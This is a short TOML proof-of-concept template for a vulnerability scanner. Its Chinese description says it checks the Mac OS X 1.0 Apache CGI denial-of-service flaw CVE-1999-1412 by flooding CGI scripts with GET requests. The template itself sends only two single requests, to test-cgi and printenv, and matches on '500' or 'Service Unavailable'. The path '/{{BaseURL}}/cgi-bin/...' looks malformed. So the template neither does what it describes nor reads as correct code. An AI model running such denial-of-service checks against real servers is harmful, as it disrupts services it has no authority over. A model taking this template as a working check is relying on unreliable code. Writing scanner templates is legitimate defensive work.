[info]
author = "ave"
description = "通过向 Mac OS X 1.0 上 Apache 服务器的 CGI 程序发送大量 HTTP GET 请求，触发进程资源耗尽，验证拒绝服务漏洞 CVE-1999-1412"
id = "POC-AVE-1999-1101"
name = "Apple Mac OS X 1.0 Apache CGI GET Flood DoS PoC"
severity = "medium"
tags = ["ave-1999-1101"]
vuln_id = [
    "CVE-1999-1412",
    "AVE-1999-1101",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cgi-bin/test-cgi"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "500",
    "Service Unavailable",
    "Resource Temporarily Unavailable",
]

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cgi-bin/printenv"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "500",
    "Service Unavailable",
    "Resource Temporarily Unavailable",
]
